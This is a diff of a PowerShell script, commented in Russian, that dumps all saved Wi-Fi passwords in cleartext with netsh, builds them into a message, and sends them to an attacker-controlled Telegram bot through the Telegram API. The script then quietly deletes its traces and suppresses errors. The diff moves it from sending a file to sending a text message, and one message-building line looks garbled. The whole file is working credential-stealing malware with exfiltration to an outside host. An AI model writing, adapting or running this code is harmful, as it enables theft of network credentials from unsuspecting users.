@@ -1,42 +1,43 @@
-# Конфигурация Telegram бота
-$BotToken = ""  # <-- ЗАМЕНИТЕ на ваш API токен от BotFather
-$ChatID = ""          # <-- ЗАМЕНИТЕ на ваш Chat ID
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$BotToken,
+    [Parameter(Mandatory=$true)]
+    [string]$ChatID
+)
 
-# Извлекаем пароли и создаем файл
+# Сбор паролей Wi-Fi
 $TempDir = "$env:temp\wifi-passwords"
 New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
 Set-Location $TempDir
 
 netsh wlan export profile key=clear | Out-Null
 
-$OutputFile = "$env:USERPROFILE\Downloads\info123.txt"
-"Сохраненные пароли Wi-Fi`n" > $OutputFile
-"=========================`n" >> $OutputFile
+# Формируем текстовое сообщение с паролями
+$Message = "📶 Сохраненные пароли Wi-Fi:`n`n"
 
 Get-ChildItem -Path "*.xml" | ForEach-Object {
     $XmlData = [xml](Get-Content $_.FullName)
     $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
     $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
-    "SSID: $SSID`nПароль: $Password`n" >> $OutputFile
+    $Message += "🔹 **SSID:** $SSID`n"
+    $Message += "🔸 **Пароль:** `$Password``$Password``$Password`n`n"
     Remove-Item $_.FullName
 }
 
-# Отправляем файл в Telegram
-$TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendDocument"
+# Отправляем сообщение в Telegram
+$TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendMessage"
 
-$File = Get-Item -Path $OutputFile
-
-$Form = @{
+$Body = @{
     chat_id = $ChatID
-    document = Get-Item -Path $OutputFile
+    text = $Message
+    parse_mode = "Markdown"
 }
 
 try {
-    Invoke-RestMethod -Uri $TelegramAPIUrl -Form $Form -Method Post | Out-Null
+    Invoke-RestMethod -Uri $TelegramAPIUrl -Body $Body -Method Post | Out-Null
 } catch {
-    # Ошибка отправки
+    # Обработка ошибок отправки
 }
 
-# Удаляем временную директорию и файл
+# Очистка
 Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue
